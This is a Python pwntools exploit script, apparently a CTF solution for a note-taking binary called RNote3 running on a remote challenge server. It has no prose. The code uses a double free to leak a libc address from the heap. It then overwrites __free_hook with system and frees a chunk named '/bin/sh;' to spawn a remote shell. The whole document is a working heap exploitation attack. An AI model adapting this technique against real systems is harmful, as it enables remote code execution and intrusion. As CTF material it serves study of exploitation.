from pwn import *

#p = process(["./RNote3"], env={"LD_PRELOAD":"./libc.so.6"})
p = remote("rnote3.2018.teamrois.cn", "7322")
context.binary = "./RNote3"
libc = ELF("./libc.so.6")

def alloc(title, size, data):
    p.sendline("1")
    p.sendlineafter("title: ", title)
    p.sendlineafter("size: ", str(size))
    p.sendafter("content: ", data)

def view(title):
    p.sendline("2")
    p.sendlineafter("title: ", title)

def edit(title, data):
    p.sendline("3")
    p.sendlineafter("title: ", title)
    p.sendafter("content: ", data)

def free(title):
    p.sendline("4")
    p.sendlineafter("title: ", title)

alloc("ddaa", 0x18, "A" * 0x18)

free("ddaa")
free("ddaa")

alloc("", 0x18, "a" * 0x18)
alloc("11", 0x80, "b" * 0x80)
alloc("stop", 0x18, "a" * 0x18)

free("11")
view("")
p.recvuntil("note content: ")
leak = u64(p.recv(6).ljust(8, "\x00"))
libc_base = leak - 0x3c4b78
mhook = libc_base + libc.symbols["__malloc_hook"]
fhook = libc_base + libc.symbols["__free_hook"]
system = libc_base + libc.symbols["system"]
log.info(hex(leak))

# clear heap

alloc("1q1q", 0x18, "g" * 0x18)
alloc("2w2w", 0x18, "h" * 0x18)
alloc("3e3e", 0x18, "j" * 0x18)

# again

alloc("qqqq", 0x18, "A" * 0x18)

free("qqqq")
free("qqqq")

alloc("\x00", 0x28, "1" * 0x28)
alloc("aacc", 0x18, "/bin/sh;" + p64(0x10) + p64(fhook))

edit("/bin/sh;", p64(system)[:-2] + "\n")
free("/bin/sh;")
p.interactive()
